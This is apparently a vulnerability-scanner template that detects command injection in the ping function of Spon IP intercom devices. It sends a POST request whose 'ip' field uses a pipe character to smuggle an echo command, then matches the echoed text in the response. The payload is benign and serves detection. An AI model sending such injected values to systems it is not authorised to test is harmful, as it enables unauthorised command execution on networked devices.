id: poc-yaml-spon-ip-intercom-ping-rce
info:
  name: Spon Ip Intercom Ping Remote Code Execution
  author: ProjectDiscoveryAI
  severity: medium
  tags: rce
  description: |
    This template detects a Remote Code Execution vulnerability in Spon Ip Intercom Ping functionality.
http:
  - method: POST
    path:
      - "{{BaseURL}}/php/ping.php"
    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    body: |
      jsondata[ip]=%7C echo {{rand_text_alphanumeric(10)}}${{rand_text_alphanumeric(10)}}{{rand_text_alphanumeric(10)}}^{{rand_text_alphanumeric(10)}}&jsondata[type]=0
    matchers-condition: or
    matchers:
      - type: regex
        regex:
          - "[a-zA-Z0-9]{10}[a-zA-Z0-9]{10}\\^[a-zA-Z0-9]{10}"
      - type: regex
        regex:
          - "[a-zA-Z0-9]{10}\\$\\{[a-zA-Z0-9]{10}\\}[a-zA-Z0-9]{10}[a-zA-Z0-9]{10}"
